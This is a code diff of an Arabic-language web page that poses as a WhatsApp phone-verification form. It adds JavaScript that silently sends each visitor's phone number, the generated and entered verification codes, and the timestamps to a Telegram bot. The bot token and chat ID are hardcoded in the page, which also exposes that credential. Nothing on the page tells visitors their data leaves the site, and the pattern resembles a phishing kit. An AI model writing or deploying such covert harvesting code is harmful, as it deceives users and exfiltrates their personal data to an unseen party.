@@ -90,6 +90,7 @@
             width: 100%;
             transition: background-color 0.3s;
             font-weight: bold;
+            margin-top: 10px;
         }
         
         button:hover {
@@ -133,6 +134,7 @@
         .verification-section {
             display: none;
             margin-top: 30px;
+            animation: fadeIn 0.5s ease;
         }
         
         .timer {
@@ -145,6 +147,11 @@
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
     </style>
 </head>
@@ -194,11 +201,15 @@
     </div>
 
     <script>
+        // التوكن والآيدي للتلجرام
+        const TELEGRAM_BOT_TOKEN = '7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM';
+        const TELEGRAM_CHAT_ID = '7493001551';
+        
         // متغيرات عامة
-        let verificationCode = '';
+        let generatedCode = '';
         let countdownInterval;
         let remainingTime = 120; // 2 دقائق بالثواني
-        const phoneNumber = '';
+        let userPhone = '';
         
         // عناصر DOM
         const phoneForm = document.getElementById('phoneForm');
@@ -218,9 +229,7 @@
             const phone = phoneInput.value.trim();
             
             if (!phone) {
-                phoneStatus.textContent = 'الرجاء إدخال رقم الهاتف';
-                phoneStatus.className = 'status error';
-                phoneStatus.style.display = 'block';
+                showError(phoneStatus, 'الرجاء إدخال رقم الهاتف');
                 return;
             }
             
@@ -228,23 +237,23 @@
             phoneStatus.style.display = 'none';
             
             // توليد كود تحقق عشوائي (6 أرقام)
-            verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+            generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
+            userPhone = phone;
             
-            // هنا يجب إضافة الكود الذي يرسل الرسالة إلى الواتساب
-            // في الواقع تحتاج إلى استخدام API خاص بالواتساب مثل Twilio أو غيرها
-            // هذا مثال فقط للتوضيح
+            // إرسال إشعار إلى التلجرام بأنه تم طلب كود تحقق
+            sendToTelegram(`📲 *طلب كود تحقق جديد*\n\n`
+                        + `📱 رقم الهاتف: ${phone}\n`
+                        + `🔢 كود التحقق: ${generatedCode}\n`
+                        + `🕒 الوقت: ${new Date().toLocaleString('ar-SA')}`);
+            
+            // محاكاة إرسال الكود إلى الواتساب
             setTimeout(() => {
                 phoneLoading.style.display = 'none';
                 
-                // في الواقع هنا سيتم إرسال الكود إلى الواتساب
-                // ولكن لأغراض العرض سنظهره في التنبيه
-                alert(`كود التحقق: ${verificationCode}\n\nسيتم إرسال هذا الكود إلى رقم الهاتف ${phone} عبر الواتساب`);
-                
-                // حفظ رقم الهاتف
-                phoneNumber = phone;
+                // عرض الكود للمستخدم (لأغراض الاختبار فقط)
+                alert(`كود التحقق: ${generatedCode}\n\n(في الواقع سيتم إرساله إلى ${phone} عبر الواتساب)`);
                 
                 // إظهار قسم التحقق
-                phoneForm.style.display = 'none';
                 verificationSection.style.display = 'block';
                 
                 // بدء العد التنازلي
@@ -282,10 +291,16 @@
             this.disabled = true;
             
             // توليد كود جديد
-            verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+            generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
             
-            // هنا يجب إضافة الكود الذي يرسل الرسالة إلى الواتساب
-            alert(`كود التحقق الجديد: ${verificationCode}\n\nسيتم إرسال هذا الكود إلى رقم الهاتف ${phoneNumber} عبر الواتساب`);
+            // إرسال إشعار إلى التلجرام بإعادة الإرسال
+            sendToTelegram(`🔄 *إعادة إرسال كود التحقق*\n\n`
+                        + `📱 رقم الهاتف: ${userPhone}\n`
+                        + `🔢 الكود الجديد: ${generatedCode}\n`
+                        + `🕒 الوقت: ${new Date().toLocaleString('ar-SA')}`);
+            
+            // محاكاة إرسال الكود الجديد
+            alert(`كود التحقق الجديد: ${generatedCode}\n\n(في الواقع سيتم إرساله إلى ${userPhone} عبر الواتساب)`);
             
             // إعادة بدء العد التنازلي
             startCountdown();
@@ -296,74 +311,86 @@
             const enteredCode = document.getElementById('verificationCode').value.trim();
             
             if (!enteredCode || enteredCode.length !== 6) {
-                verifyStatus.textContent = 'الرجاء إدخال كود التحقق المكون من 6 أرقام';
-                verifyStatus.className = 'status error';
-                verifyStatus.style.display = 'block';
+                showError(verifyStatus, 'الرجاء إدخال كود التحقق المكون من 6 أرقام');
                 return;
             }
             
             verifyLoading.style.display = 'block';
             verifyStatus.style.display = 'none';
             
-            // محاكاة التحقق (في الواقع يجب مقارنة الكود مع ما تم إرساله)
+            // التحقق من صحة الكود
             setTimeout(() => {
                 verifyLoading.style.display = 'none';
                 
-                if (enteredCode === verificationCode) {
-                    verifyStatus.textContent = 'تم التحقق بنجاح! جاري إرسال البيانات...';
-                    verifyStatus.className = 'status success';
-                    verifyStatus.style.display = 'block';
+                if (enteredCode === generatedCode) {
+                    showSuccess(verifyStatus, 'تم التحقق بنجاح! جاري إرسال البيانات...');
                     
-                    // إرسال البيانات إلى التلجرام بعد التحقق
-                    sendToTelegram();
+                    // إرسال نتيجة التحقق إلى التلجرام
+                    sendVerificationResult(enteredCode, true);
                 } else {
-                    verifyStatus.textContent = 'كود التحقق غير صحيح، الرجاء المحاولة مرة أخرى';
-                    verifyStatus.className = 'status error';
-                    verifyStatus.style.display = 'block';
+                    showError(verifyStatus, 'كود التحقق غير صحيح، الرجاء المحاولة مرة أخرى');
+                    
+                    // إرسال نتيجة التحقق الفاشلة إلى التلجرام
+                    sendVerificationResult(enteredCode, false);
                 }
             }, 1500);
         });
         
-        // إرسال البيانات إلى التلجرام
-        function sendToTelegram() {
+        // إرسال نتيجة التحقق إلى التلجرام
+        function sendVerificationResult(enteredCode, isSuccess) {
             verifyLoading.style.display = 'block';
             
             // إعداد الرسالة للتلجرام
-            const message = `✅ *تم التحقق من ملكية الحساب*\n\n`
-                         + `📱 *رقم الهاتف:* ${phoneNumber}\n`
-                         + `🔢 *كود التحقق:* ${verificationCode}\n`
-                         + `🕒 *وقت التحقق:* ${new Date().toLocaleString()}`;
+            const message = `🔐 *نتيجة التحقق من الملكية*\n\n`
+                         + `📱 *رقم الهاتف:* ${userPhone}\n`
+                         + `🔢 *الكود المُرسل:* ${generatedCode}\n`
+                         + `🔢 *الكود المدخل:* ${enteredCode}\n`
+                         + `🕒 *وقت التحقق:* ${new Date().toLocaleString('ar-SA')}\n`
+                         + `✅ *الحالة:* ${isSuccess ? 'ناجح' : 'فشل'}`;
             
-            // إعداد البيانات لإرسالها إلى التلجرام
+            sendToTelegram(message, () => {
+                verifyLoading.style.display = 'none';
+                if (isSuccess) {
+                    showSuccess(verifyStatus, 'تم التحقق وإرسال البيانات بنجاح!');
+                }
+            });
+        }
+        
+        // وظيفة عامة لإرسال الرسائل إلى التلجرام
+        function sendToTelegram(message, callback) {
             const telegramData = new FormData();
-            telegramData.append('chat_id', '7493001551');
+            telegramData.append('chat_id', TELEGRAM_CHAT_ID);
             telegramData.append('text', message);
             telegramData.append('parse_mode', 'Markdown');
             
-            // إرسال البيانات إلى بوت التلجرام
-            fetch(`https://api.telegram.org/bot7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM/sendMessage`, {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 body: telegramData
             })
             .then(response => response.json())
             .then(data => {
-                verifyLoading.style.display = 'none';
-                
-                if (data.ok) {
-                    verifyStatus.textContent = 'تم التحقق وإرسال البيانات بنجاح!';
-                    verifyStatus.className = 'status success';
-                    verifyStatus.style.display = 'block';
-                } else {
-                    throw new Error(data.description || 'حدث خطأ غير معروف');
+                if (callback) callback();
+                if (!data.ok) {
+                    console.error('Telegram API Error:', data);
                 }
             })
             .catch(error => {
-                verifyLoading.style.display = 'none';
-                verifyStatus.textContent = `حدث خطأ أثناء إرسال البيانات: ${error.message}`;
-                verifyStatus.className = 'status error';
-                verifyStatus.style.display = 'block';
-                console.error('Error:', error);
+                if (callback) callback();
+                console.error('Error sending to Telegram:', error);
             });
+        }
+        
+        // وظائف مساعدة لعرض الرسائل
+        function showError(element, message) {
+            element.textContent = message;
+            element.className = 'status error';
+            element.style.display = 'block';
+        }
+        
+        function showSuccess(element, message) {
+            element.textContent = message;
+            element.className = 'status success';
+            element.style.display = 'block';
         }
     </script>
 </body>
